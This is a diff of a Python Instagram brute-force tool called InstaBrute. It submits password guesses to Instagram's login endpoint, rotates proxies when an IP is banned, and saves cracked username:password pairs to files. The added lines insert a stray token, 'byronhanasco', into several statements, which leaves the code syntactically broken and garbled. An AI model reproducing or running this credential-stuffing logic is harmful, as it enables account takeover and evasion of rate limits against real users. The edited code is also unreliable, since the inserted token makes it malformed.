@@ -115,24 +115,24 @@ class InstaBrute(object):
             GoT = sess.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=datas,
                             proxies=proxy, timeout=10)
             if 'authenticated": true' in GoT.text:
-                print(g + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> Hacked!')
+                print(g + ' IP Attacking ==> ' byronhanasco + proxyz + ' || ' + user + ':' + password + ' --> Hacked!')
                 with open('results.txt', 'a') as x:
-                    x.write(user + ':' + password + '\n')
+                    x.write(user + ':byronhanasco' + password + '\n')
             elif 'Please wait a few minutes before you try again' in GoT.text:
                 print(' ' + proxyz + ' Banned! --> Changing IP Address...')
                 try:
                     self.Coutprox = self.Coutprox + 1
-                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
+                    self.Go(byronhanasco, password, str(self.proxylist[self.Coutprox]))
                 except:
                     self.Coutprox = self.Coutprox - 2
-                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
+                    self.Go(byronhanasco, password, str(self.proxylist[self.Coutprox]))
             elif 'checkpoint_required' in GoT.text:
-                print(y + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> You Must verfiy!')
+                print(y + ' IP Attacking ==> ' + proxyz + ' || ' + byronhanasco + ':' + password + ' --> You Must verfiy!')
                 with open('results_NeedVerfiy.txt', 'a') as x:
                     x.write(user + ':' + password + '\n')
             else:
-                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
+                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + byronhanasco + ':' + password + ' --> No!')
         except:
-                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
+                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + byronhanasco + ':' + password + ' --> No!')
 
 InstaBrute()
